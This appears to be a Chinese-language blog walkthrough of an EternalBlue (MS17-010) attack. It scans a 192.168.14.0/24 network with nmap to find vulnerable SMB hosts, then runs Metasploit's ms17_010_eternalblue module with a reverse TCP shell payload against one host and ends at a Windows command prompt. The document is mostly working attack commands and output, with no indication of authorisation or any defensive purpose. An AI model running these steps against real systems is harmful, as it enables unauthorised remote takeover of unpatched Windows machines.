@@ -1,0 +1,167 @@
+一次对445 端口攻击  --永恒之蓝
+
+扫描局域网中开启445端口的主机
+
+root@kali:~# nmap -n -p445 --script smb-vuln-ms17-010 192.168.14.0/24 --open
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-17 10:08 CST
+Nmap scan report for 192.168.14.37
+Host is up (0.00030s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 54:E1:AD:70:64:90 (Lcfc(hefei) Electronics Technology)
+
+Nmap scan report for 192.168.14.228
+Host is up (0.00090s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 08:60:6E:8B:6D:98 (Asustek Computer)
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+Nmap scan report for 192.168.14.230
+Host is up (0.00074s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 28:D2:44:24:ED:F5 (Lcfc(hefei) Electronics Technology)
+
+Nmap scan report for 192.168.14.231
+Host is up (0.0012s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 54:E1:AD:3D:16:80 (Lcfc(hefei) Electronics Technology)
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+Nmap scan report for 192.168.14.233
+Host is up (0.00042s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 30:5A:3A:AA:D4:EE (Asustek Computer)
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+Nmap scan report for 192.168.14.234
+Host is up (0.00045s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 8C:EC:4B:6D:BA:CA (Unknown)
+
+Nmap done: 256 IP addresses (37 hosts up) scanned in 3.36 seconds
+放一部分吧，通过上面结果我们可以知道，有哪些主机是可以进行攻击的，接下来，就交给msf了
+
+在msf中也可以查找，不过相对而言命令要多了一点
+实战
+
+msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.14.231
+RHOST => 192.168.14.231
+msf exploit(windows/smb/ms17_010_eternalblue) > show options 
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name                Current Setting  Required  Description
+   ----                ---------------  --------  -----------
+   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.
+   GroomDelta          5                yes       The amount to increase the groom count by per try.
+   MaxExploitAttempts  3                yes       The number of times to retry the exploit.
+   ProcessName         spoolsv.exe      yes       Process to inject payload into.
+   RHOST               192.168.14.231   yes       The target address
+   RPORT               445              yes       The target port (TCP)
+   SMBDomain           .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                              no        (Optional) The password for the specified username
+   SMBUser                              no        (Optional) The username to authenticate as
+   VerifyArch          true             yes       Check if remote architecture matches exploit Target.
+   VerifyTarget        true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.14.235   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+msf exploit(windows/smb/ms17_010_eternalblue) > exploit 
+
+[*] Started reverse TCP handler on 192.168.14.235:4444 
+[*] 192.168.14.231:445 - Connecting to target for exploitation.
+[+] 192.168.14.231:445 - Connection established for exploitation.
+[+] 192.168.14.231:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.14.231:445 - CORE raw buffer dump (38 bytes)
+[*] 192.168.14.231:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
+[*] 192.168.14.231:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
+[*] 192.168.14.231:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
+[+] 192.168.14.231:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 192.168.14.231:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.14.231:445 - Sending all but last fragment of exploit packet
+[*] 192.168.14.231:445 - Starting non-paged pool grooming
+[+] 192.168.14.231:445 - Sending SMBv2 buffers
+[+] 192.168.14.231:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 192.168.14.231:445 - Sending final SMBv2 buffers.
+[*] 192.168.14.231:445 - Sending last fragment of exploit packet!
+[*] 192.168.14.231:445 - Receiving response from exploit packet
+[+] 192.168.14.231:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 192.168.14.231:445 - Sending egg to corrupted connection.
+[*] 192.168.14.231:445 - Triggering free of corrupted buffer.
+[*] Command shell session 2 opened (192.168.14.235:4444 -> 192.168.14.231:50949) at 2018-08-17 12:00:02 +0800
+[+] 192.168.14.231:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.14.231:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.14.231:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+C:\Windows\system32>     ##成功
+
+
